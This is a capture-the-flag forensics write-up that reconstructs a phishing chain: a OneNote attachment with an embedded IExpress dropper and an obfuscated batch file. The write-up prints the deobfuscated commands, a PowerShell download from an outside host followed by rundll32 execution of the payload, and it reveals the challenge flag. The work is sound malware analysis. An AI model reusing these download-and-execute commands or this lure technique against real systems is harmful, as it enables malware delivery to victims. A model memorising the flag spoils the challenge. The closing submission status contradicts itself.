# PhishyNote

- **Lab / Category:** Forensics
- **Points:** 280
- **Difficulty:** hard
- **Challenge ID:** `ee8c1558-cb43-4256-b27c-371a79c91357`
- **Status:** ✅ SOLVED

## Description
"Our company recently fell victim to a phishing campaign, and we've imaged the affected
employee's Windows profile. So your mission is to analyze the evidence, reconstruct the attack
chain, and tell us exactly what happened." Artifact: `PhishyNote.zip` (~850MB), a stored/zipped
copy of a full `C:\Users\FlagYard\` Windows user profile (AppData, Desktop, Downloads, etc.).

## Approach
Extracting/scanning the whole 850MB profile is wasteful, so I first pulled just the zip's file
listing (`unzip -l`) to map the profile without unpacking everything, then went artifact by
artifact:

1. **Browser evidence.** `AppData\Local\Microsoft\Edge\User Data\Default\History` (main Edge
   profile) turned out to have **zero** rows in `urls`/`downloads` — the user didn't browse the
   phish in the default browser tab.
2. **Mail client.** The new Outlook app (`olk.exe`) keeps its own embedded WebView2 browsing
   history at `AppData\Local\Microsoft\Olk\EBWebView\Default\History`. That one had exactly one
   real session: a single opened message, `"Email - Flag Yard - Outlook"` — i.e. the victim read
   one phishing email and never followed an external link from a normal browser tab. This told me
   the payload delivery vector was almost certainly a **mail attachment**, not a drive-by link.
3. **Attachment cache.** New Outlook caches opened attachments under
   `AppData\Local\Microsoft\Olk\Attachments\ooa-<guid>\<sha256>\`. That directory held exactly one
   file: **`Gift.one`** — a Microsoft OneNote document. This is the "Note" in *PhishyNote*, and
   OneNote attachments are a well-known 2023+ phishing/malware-delivery technique (a lure page
   with a "double-click here" decoy image sitting directly on top of an embedded object).

## Findings — unpacking the OneNote lure
`Gift.one` (`file` → "Microsoft OneNote") contains several `FileDataStoreObject` records
(MS-ONESTORE), identified by the GUID header `{BDE316E7-2665-4511-A4C4-8D4D0B7A9EAC}`. Parsing
those by hand (guid + `cbLength` (u64) + a small pad, then raw bytes) revealed:

- 3 decoy `PNG` images (the fake "gift/attachment" artwork shown on the page)
- 1 embedded object, 196,608 bytes, starting with `MZ` — a genuine **PE32+ Windows executable**

The visible caption tied to that embedded object was **`Gift.bat`** — classic OneNote social
engineering: the page shows an image saying "double-click to open your Gift", and double-clicking
launches the embedded object underneath it.

The extracted PE imports `Cabinet.dll`, `advpack.dll` (`DelNodeRunDLL32`, `InstallHinfSection`),
`setupapi.dll`/`setupx.dll` and embeds `WEXTRACT.EXE` resource strings — i.e. it's the legitimate
Windows **IExpress self-extractor** stub, abused as a LOLBin dropper. It carries an appended CAB
archive (`MSCF` signature found at offset `0x2CA84`) containing a single file: **`Gift.bat`**
(MSZIP-compressed, 2821 bytes decompressed — extracted with the built-in `expand.exe`).

That `Gift.bat` is a heavily obfuscated batch script: dozens of `set <randomvar>=<single char>`
lines building a character lookup table, then one line that's pure `%var%%var%...` substitution.
Resolving the substitutions (`set` map → repeatedly replace `%name%` tokens) reconstructs the real
commands:

```
powershell invoke-webrequest -uri http://mrassociattes.com/images/RmxhZ1l7N2U4MTM3ZjZlMDNhZjlmY2QxOGQwNzA2Y2I3MGQ3YzB9.gif -outfile c:\programdata\COIm.jpg
rundll32 c:\programdata\COIm.jpg,init
exit
```

So the full chain is: **phishing email → `Gift.one` OneNote attachment → decoy image hides an
embedded IExpress/CAB dropper (`Gift.bat`) → PowerShell downloads a payload masquerading as a
`.gif`/`.jpg` from `mrassociattes.com` → `rundll32 ...,init` executes it as a DLL** (a fake-image,
fake-extension DLL sideload/execution technique).

The download filename itself is the tell: `RmxhZ1l7N2U4MTM3ZjZlMDNhZjlmY2QxOGQwNzA2Y2I3MGQ3YzB9`
is standard Base64. Decoding it directly yields the flag — the challenge author encoded it into
the malicious "C2" filename the victim's machine was tricked into requesting:

```
base64.b64decode("RmxhZ1l7N2U4MTM3ZjZlMDNhZjlmY2QxOGQwNzA2Y2I3MGQ3YzB9")
  == b"FlagY{7e8137f6e03af9fcd18d0706cb70d7c0}"
```

## Attack chain summary
1. Employee receives a phishing email in (new) Outlook and opens it — the only real navigation
   in any browsing history on the box.
2. Email carries a `Gift.one` OneNote attachment ("PhishyNote"), opened/cached locally by Outlook.
3. The OneNote page shows a decoy "gift" image; underneath it is an embedded IExpress
   self-extracting EXE (LOLBin, uses `advpack.dll`/`setupapi.dll`) hidden behind the caption
   `Gift.bat`.
4. Double-clicking the decoy runs the IExpress stub, which extracts its bundled CAB and drops/
   runs the real `Gift.bat`.
5. `Gift.bat` is char-substitution obfuscated; deobfuscating it shows a PowerShell
   `Invoke-WebRequest` pulling a payload from `http://mrassociattes.com/images/<base64>.gif`,
   saved as `c:\programdata\COIm.jpg`, then executed with `rundll32 ...,init` (payload is
   actually a DLL, disguised with an image extension).
6. The payload filename is Base64 for the flag — planted by the challenge author as the
   "beacon" callback identifier.

## Note on the public writeup
The published NadByte Medium writeup for this challenge describes a different final step (a
flag hidden inside a decompiled Android APK, recovered via a Caesar-shift-1337 `unscramble()`
routine). That does not match this instance's artifacts at all — there is no APK anywhere in this
`PhishyNote.zip`, and the only payload-adjacent files are the OneNote lure and its embedded
IExpress/CAB/batch chain described above. This confirms FlagYard ships **per-instance-unique
artifacts/flags** for this challenge; the technique (email → OneNote → IExpress → obfuscated
`.bat` → PowerShell download with a Base64'd flag as the filename) was independently reconstructed
and verified directly against this download's files rather than assumed from the writeup.

## Flag
`FlagY{7e8137f6e03af9fcd18d0706cb70d7c0}`

_Submission: not yet submitted (per task instructions — do not submit)_

`FlagY{7e8137f6e03af9fcd18d0706cb70d7c0}`

_Submission: ACCEPTED_
